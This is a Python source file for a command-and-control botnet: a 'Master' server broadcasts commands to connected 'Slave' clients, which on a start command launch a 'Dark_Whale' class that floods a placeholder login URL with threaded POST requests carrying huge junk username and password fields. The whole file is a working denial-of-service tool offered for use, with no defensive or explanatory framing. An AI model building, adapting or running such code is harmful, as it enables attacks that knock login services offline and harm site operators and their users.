import asyncio
from nis import cat
import threading
import subprocess
import requests
import random
import string
import time
import json
import sys

class Master:
    def __init__(self):
        file_load = open("config.json")
        config = json.load(file_load)
        self.host = config["host"]
        self.port = config["port"]
        #self.queue = config["queue_size"]
        command_file_load = open("commands.json")
        self.commands = json.load(command_file_load)
        self.peers = {}
        thread = threading.Thread(target=asyncio.run, args=(self.send_command(),))
        thread.start()
        loop = asyncio.new_event_loop()
        loop.run_until_complete(self.server())
    
    async def listen_and_accept(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        address, port = writer.get_extra_info("peername")
        self.peers[str(address)+":"+str(port)] = {"reader":reader, "writer":writer}
        print(";Connection established " + str(address)+":"+str(port))

    async def send_command(self) -> None:
        while True:
            command = input("Command line >> ")
            if command == self.commands["clear"]:
                subprocess.run("clear")
                continue
            try:
                peers_copy = self.peers.copy()
                for client_address in peers_copy:
                    if command == self.commands["list"]:
                        print(client_address)
                        continue
                    client = peers_copy[client_address]
                    writer = client["writer"]
                    try:
                        if writer.is_closing():
                                raise Exception("Socket closed")
                        writer.write(command.encode())
                        await writer.drain()
                        print(";Command " + command)
                        if command == self.commands["quit"]:
                            raise Exception("Socket closing")
                    except Exception as e:
                        print(e)
                        address, port = writer.get_extra_info("peername")
                        print(";Connection closed " + str(address)+":"+str(port))
                        try:
                            del self.peers[client_address]
                            writer.close()
                            await writer.wait_closed()
                            subprocess.run(["fuser", "-k", str(port) + "/tcp"])
                            print(";Closed port " + str(port))
                        except Exception as e:
                            print(e)
                            subprocess.run(["fuser", "-k", str(port) + "/tcp"])
                if command == self.commands["quit"]:
                    break
            except Exception as e:
                print(e)
        print(";Server stopped")

    async def server(self) -> None:
        print(";Server started")
        server = await asyncio.start_server(self.listen_and_accept, self.host, self.port)
        async with server:
            await server.serve_forever()

class Slave:
    def __init__(self):
        file_load = open("config.json")
        config = json.load(file_load)
        self.host = config["host"]
        self.port = config["port"]
        self.queue = config["queue_size"]
        command_file_load = open("commands.json")
        self.commands = json.load(command_file_load)
        self.threads = 0
        #self.stop = False
        self.stresser = None
    
    async def client(self) -> None:
        print(";Client started")
        while True:
            try:
                reader, writer = await asyncio.open_connection(self.host, self.port)
                writer.write(b'')
                break
            except:
                await asyncio.sleep(2)
                continue
        print(";Client connected")
        data = ""
        thread = None
        while True:
            try:
                data = await reader.read(self.queue)
                print(";Received data " + str(data.decode()))
                data = json.loads(data.decode())
                if not data or data["command"] == self.commands["quit"]:
                    self.stresser.stop = True
                    raise Exception("Socket closed")
                if data["command"] == self.commands["start"]:
                    self.threads = int(data["peers"])
                    thread = threading.Thread(target=self.attack)
                    thread.start()
                    print(";Started attack")
                if data["command"] == self.commands["stop"]:
                    self.stresser.stop = True
                    print(";Stopped attack")
            except Exception as e:
                print(e)
                address, port = writer.get_extra_info("peername")
                try:
                    writer.close()
                    await writer.wait_closed()
                    subprocess.run(["fuser", "-k", str(port) + "/tcp"])
                except Exception as e:
                    print(e)
                    subprocess.run(["fuser", "-k", str(port) + "/tcp"])
                print(";Process quit")
                self.stresser.stop = True
                break
        self.start_client()

    def attack(self) -> None:
        self.stresser = Dark_Whale(self.threads)
        self.stresser.stop = False
        for i in range(self.stresser.get_threads()):
            thread = threading.Thread(target=self.stresser.attack)
            thread.start()

    def start_client(self) -> None:
        thread = threading.Thread(target=asyncio.run, args=(self.client(),))
        thread.start()

class Dark_Whale:
    def __init__(self, number_of_threads) -> None:
        self.number_of_threads = number_of_threads
        self.data = str(random.choices(string.ascii_lowercase, k=99999))
        self.headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        self.post_url = "<login page url>"
        #Example
        self.package = f'"<LOGUSER={self.data}&LOGPASS={self.data}>'
        self.stop = False
        print(";Dark Whale attack has started")

    def get_some_sleep(self) -> None:
        delay_time = random.uniform(0, 1)
        time.sleep(delay_time)

    def attack(self) -> None:
        self.get_some_sleep()
        while True:
            if self.stop == True:
                break
            try:
                r = requests.post(self.post_url, data= self.package, headers=self.headers)
            except:
                self.attack()
        print(";Finished attack")
    
    def get_threads(self) -> int:
        return self.number_of_threads

if __name__=="__main__":
    try:
        flaggs = sys.argv
        if flaggs[1] == "--master":
            print(";Master created")
            master = Master()
        elif flaggs[1] == "--slave":
            print(";Slave created")
            slave = Slave()
            slave.start_client()
    except:
        print("Incorrect input. Closing program.")
